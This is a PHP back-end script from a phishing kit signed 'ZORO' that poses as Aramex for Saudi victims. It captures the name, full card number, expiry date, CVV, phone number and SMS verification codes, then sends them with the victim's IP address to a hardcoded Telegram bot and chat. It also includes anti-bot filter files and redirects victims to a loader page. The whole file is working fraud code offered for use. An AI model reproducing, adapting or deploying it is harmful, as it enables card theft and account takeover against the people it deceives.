<?php	

	session_start(); 
	//error_reporting(0);
		
		// ─── ❝ ✎ 𝙕𝙊𝙍𝙊™ MOTHER ッ ❞ ──── //

			include "Bots/#01.php";
			include "Bots/#02.php";
			include "Bots/#03.php";
			include "Bots/#04.php";
			include "Bots/#05.php";
			include "Bots/#06.php";
			include "Bots/#07.php";
			include "Bots/#08.php";
			include "Bots/#09.php";
			include "Bots/#10.php";
			include "Bots/#11.php";
			include "Bots/GetOS.php";			
			
		$config_token = "6246452300:AAEIsvewcfzonXr1AZ2n_nnY47QmYPMvb94";
		$config_chat = "-965015113";
			
	################ ✎ 𝙕𝙊𝙍𝙊™  ッ ##################
		//  ──────── ❝ HTTP USER AGENT IP ❞ ──────  //

		$ip = $_SERVER["REMOTE_ADDR"];
		$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
		date_default_timezone_set('Africa/Cairo');
		$date = date('d/m/Y h:i:sa');
		$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

	################ ✎ 𝙕𝙊𝙍𝙊™  ッ ###################
	  //  ───────── ❝ Call API Telegram ❞ ───────  //

		function callAPI($url){
		   $curl = curl_init();
		   curl_setopt($curl, CURLOPT_URL, $url);
		   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
		   // EXECUTE:
		   $result = curl_exec($curl);
		   curl_close($curl);
		}
		
    ################ ✎ 𝙕𝙊𝙍𝙊™  ッ ##################
	//  ──────── ❝ SEND POST LOGIN ❞ ──────  //


		if (isset($_POST['name'])) {
		
			$nam = $_SESSION['dn'] = $_POST['name'];
			$crd = $_SESSION['crd'] = $_POST['aramex'];
			$dexp = $_SESSION['pin'] = $_POST['dexp'];
			$cvv = $_SESSION['cvv'] = $_POST['cvv'];
			$tel = $_SESSION['teel'] = $_POST['tel'];
		
			$OK = urlencode(" 🇸🇦 <b>Aramex</b> : ".$ip."\n\n");
			$OK.= urlencode("» <b> Name</b> : ".$nam."\n");
			$OK.= urlencode("» <b> Mobile</b> : +966 ".$tel."\n\n");
			$OK.= urlencode("» ".$crd."\n");
			$OK.= urlencode("» ".$dexp."\n");
			$OK.= urlencode("» ".$cvv."\n\n");

			
			callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$OK.'&parse_mode=html');
			//$Pag = substr($crd, -4, 4) ;$fPag=fopen("./crd.txt","w");fwrite($fPag,$Pag);
			$Pag = str_pad(substr($crd, -4 ), 16, 'X', STR_PAD_LEFT) ;$fPag=fopen("./crd.txt","w");fwrite($fPag,$Pag);
			$Pag = '966'.$tel.'+' ;$fPag=fopen("./tel.txt","w");fwrite($fPag,$Pag);
			
			header("location:Loader.php");
		}
		
		if (isset($_POST['SmsArmex'])) {
		
			$Log = $_SESSION['dn'] = $_POST['SmsArmex'];
		
			$OK = urlencode(" 🇸🇦 <b>Aramex</b> : ".$ip."\n\n");
			$OK.= urlencode("»<b> Sms</b> : ".$Log."\n\n");
			
			callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$OK.'&parse_mode=html');

			header("location:Loader.php");
		}

?>

